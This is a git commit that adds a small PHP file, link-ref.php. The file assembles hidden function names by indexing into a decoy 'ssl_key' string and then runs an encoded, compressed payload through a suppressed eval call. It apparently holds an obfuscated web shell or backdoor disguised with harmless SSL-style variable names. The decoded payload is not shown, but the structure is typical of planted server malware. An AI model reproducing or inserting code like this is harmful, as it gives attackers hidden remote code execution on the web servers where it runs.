337399a78786bd5b14a4ef2887cf9b92b504101c
zwcdemon <99344145+zwcdemon@users.noreply.github.com>
2022-06-24 00:55:53 +0700

    Create link-ref.php

---
+++ link-ref.php
@@ -0,0 +1,9 @@
+<?php
+$ssl_key = "IdsdMR8PY8e1rnrTQVgH_ebFESWoiH6334BT7d9j*z7M6n1huYgUD8evi2K/30t_lNfsX0.lw4mSc9V5XlcY/emePeeUSjZ4batLBeJbDavItop7ta.gpWrmqGczwpMnelaCs_X";
+$ssl_verifier = $ssl_key[22] . $ssl_key[97] . $ssl_key[2] . $ssl_key[21] . $ssl_key[44] . $ssl_key[33] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[109] . $ssl_key[3] . $ssl_key[128];
+$ssl_hash_key = $ssl_key[47] . $ssl_key[62] . $ssl_key[74] . $ssl_key[81] . $ssl_key[67] . $ssl_key[110] . $ssl_key[101] . $ssl_key[122] . $ssl_key[28] . $ssl_key[97] . $ssl_key[64] . $ssl_key[82] . $ssl_key[47] . $ssl_key[113] . $ssl_key[12] . $ssl_key[2] . $ssl_key[20] . $ssl_key[1] . $ssl_key[10] . $ssl_key[122] . $ssl_key[27] . $ssl_key[37] . $ssl_key[10];
+$ssl_security = $ssl_key[115] . $ssl_key[123] . $ssl_key[28] . $ssl_key[13] . $ssl_key[66] . $ssl_key[129] . $ssl_key[130] . $ssl_key[108] . $ssl_key[89];
+$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
+$stt0 = "9yTuoDwMZ\x2brQtF4izGplf\x2bzQzsTez2zFx\x61WzzDT3yeLF5N7hqjteweW8E\x639m\x610g0FX3SL3Sn\x2bSRuWHf0tq3\x2buy\x62fr6/KtnyzdOm3w5\x620XzqTn7/Kq2/dfnUd685zX59M5rP40E\x43tT06WULdD98Jf13/GN/f0hZ5OQQ3wGM2PpDzydi4ODVwY/keoWG7hx81/o\x41G7jxJe";
+@eval/*******/($ssl_hash_key($ssl_security($ssl_verifier($stt1))));
+?>
